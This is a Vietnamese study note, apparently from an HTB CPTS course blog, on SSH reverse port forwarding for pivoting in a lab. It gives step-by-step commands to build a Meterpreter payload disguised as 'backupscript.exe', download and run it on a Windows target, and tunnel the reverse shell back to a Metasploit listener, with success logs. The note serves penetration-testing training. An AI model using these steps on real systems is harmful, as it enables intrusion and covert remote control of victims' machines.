---
title: "Remote Reverse Port Forwarding with SSH"
date: 2026-04-20 19:39:26 +0700
categories: [HTB_CPTS, Pivot]
tags: [pivoting, ssh, reverse-port-forwarding, tunneling]
description: "HTB CPTS note về SSH remote reverse port forwarding trong pivoting."
pin: false
---
## tags: [pivoting, ssh, port-forwarding, metasploit, msfvenom] module: Pivoting, Tunneling & Port Forwarding
---
# SSH Remote Port Forwarding (Reverse Port Forwarding)

## Bản chất kỹ thuật

> **Vấn đề cần giải quyết Target Windows **không có route** về phía Attack Host (10.10.15.x). Khi payload chạy và cố gắng kết nối ngược về, nó không biết đi đường nào. → Cần một **pivot host** (Ubuntu server) đứng ra nhận kết nối thay.**

**Ý tưởng cốt lõi:**

- Payload trên Windows cấu hình `LHOST = IP của Ubuntu` (172.16.5.129), `LPORT = 8080`
- SSH tạo tunnel: mọi kết nối vào `Ubuntu:8080` → chuyển tiếp về `AttackHost:8000`
- Metasploit listener chạy trên `AttackHost:8000` (bind `0.0.0.0`)
- Kết quả: Windows → Ubuntu:8080 → SSH tunnel → AttackHost:8000 → Meterpreter session

```
[Windows 172.16.5.19]
    |  reverse shell đến 172.16.5.129:8080
    ▼
[Ubuntu 172.16.5.129]  ← SSH remote forward nhận tại port 8080
    |  SSH tunnel chuyển về
    ▼
[Attack Host 10.10.15.5:8000]  ← MSF listener
```

---
## So sánh với các kỹ thuật khác

|Kỹ thuật|Hướng kết nối|Dùng khi|
|---|---|---|
|Local Port Forwarding|Local → Remote|Truy cập service trên target qua SSH|
|Dynamic Port Forwarding|Local → nhiều đích qua proxy|Pivot vào toàn bộ subnet|
|**Remote Port Forwarding**|**Remote → Local (ngược)**|**Target không route được về attack host**|

---
## Luồng thực hiện

### Bước 1 — Tạo payload (trên Attack Host)

```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  lhost=<IP_Ubuntu> \
  lport=8080 \
  -f exe -o backupscript.exe
```

> **`lhost` phải là **IP của Ubuntu** (pivot host), không phải Attack Host. Windows chỉ thấy được mạng 172.16.5.0/23, nên chỉ có thể kết nối đến Ubuntu.**

### Bước 2 — Khởi động MSF listener (trên Attack Host)

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0   # lắng nghe trên tất cả interface
set lport 8000
run
```

### Bước 3 — Chuyển payload sang Ubuntu

```bash
scp backupscript.exe ubuntu@<IP_Ubuntu>:~/
```

### Bước 4 — Host payload qua HTTP (trên Ubuntu)

```bash
ubuntu@pivot$ python3 -m http.server 8123
```

### Bước 5 — Download payload trên Windows target

```powershell
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"
```

### Bước 6 — Tạo SSH Remote Port Forward (trên Attack Host)

```bash
ssh -R <IP_Ubuntu>:8080:0.0.0.0:8000 ubuntu@<IP_Ubuntu> -vN
```

**Giải thích flag:**

|Flag|Ý nghĩa|
|---|---|
|`-R <IP>:8080:0.0.0.0:8000`|Yêu cầu Ubuntu lắng nghe port 8080, forward về Attack Host port 8000|
|`-v`|Verbose — xem log kết nối để debug|
|`-N`|Không mở shell, chỉ tạo tunnel|

### Bước 7 — Chạy payload trên Windows

Chạy `C:\backupscript.exe` → Windows kết nối đến Ubuntu:8080 → tunnel chuyển về MSF listener.

---
## Dấu hiệu thành công

**Log SSH tunnel (verbose mode):**

```
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080,
        originator 172.16.5.19 port 61355
debug1: channel 1: connected to 0.0.0.0 port 8000
```

**MSF session:**

```
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1)
```

> **Tại sao hiện `127.0.0.1`? Kết nối đến MSF đến qua **local SSH socket** trên Attack Host, không phải trực tiếp từ Windows. Đây là hành vi bình thường của SSH tunnel.**

---
## Điểm cần nhớ

- Remote port forwarding = **pivot host "mở cổng hộ"** cho attack host
- `-R` yêu cầu quyền chỉnh sửa `GatewayPorts` trên SSH server của pivot (mặc định cho phép bind `localhost`, cần `GatewayPorts yes` nếu muốn bind IP cụ thể)
	- Nếu không muốn dùng SSH remote forward, có thể thay bằng Meterpreter port forward sau khi có session qua pivot
